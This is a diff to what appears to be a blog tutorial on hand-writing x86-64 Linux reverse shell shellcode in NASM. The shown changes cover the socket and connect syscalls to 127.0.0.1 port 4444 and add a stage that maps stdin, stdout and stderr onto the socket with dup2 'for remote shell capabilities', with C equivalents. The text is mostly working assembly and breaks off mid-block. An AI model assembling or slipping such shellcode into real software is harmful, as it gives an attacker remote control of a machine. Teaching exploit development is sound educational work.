@@ -193,6 +193,8 @@ mov rdi, 2 ;Value for AF_INET
 mov rsi, 1 ;Value for SOCK_STREAM
 mov rdx, 0 ;Third argument where we need to pass a 0
 syscall //Give the syscall instruction
+
+mov rdi, rax //store file descriptor that is returned by the syscall in rdi for future use.
 ```
 
 Again, if the block of code above makes no sense to you then go and read the previous blogposts first.
@@ -210,38 +212,46 @@ connect(sock, (struct sockaddr *)&server, sockaddr_len);
 ```
 
 ```nasm
+xor rax, rax
 
-        mov rdi, rax
+push rax
+        
+mov dword [rsp-4], 0x7f000001
+mov word [rsp-6], 0x5c11
+mov word [rsp-8], 0x2
+sub rsp, 8
+        
+mov rax, 42
+mov rsi, rsp
+mov rdx, 16
+syscall       
+```
 
-        xor rax, rax
+<h3>Stage 3 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>
 
-        push rax
-        
-        mov dword [rsp-4], 0x7f000001
-        mov word [rsp-6], 0x5c11
-        mov word [rsp-8], 0x2
-        sub rsp, 8
-        
-        mov rax, 42
-        mov rsi, rsp
-        mov rdx, 16
-        syscall
-        
+This one is straight forward again, we just need to use dup2 three times for mapping the shell capabilities. You should be able to do these three by yourself now. Remember that we stored our file descriptor for our 'sock' in RDI already. 
+
+```c
+dup2(sock, 0);
+dup2(sock, 1);
+dup2(sock, 2);
 ```
 
 ```nasm
+mov rax, 33
+mov rsi, 0
+syscall
 
-        mov rax, 33
-        mov rsi, 0
-        syscall
+mov rax, 33
+mov rsi, 1
+syscall
 
-        mov rax, 33
-        mov rsi, 1
-        syscall
+mov rax, 33
+mov rsi, 2
+syscall
+```
 
-        mov rax, 33
-        mov rsi, 2
-        syscall
+```nasm
 
         xor rax, rax
 
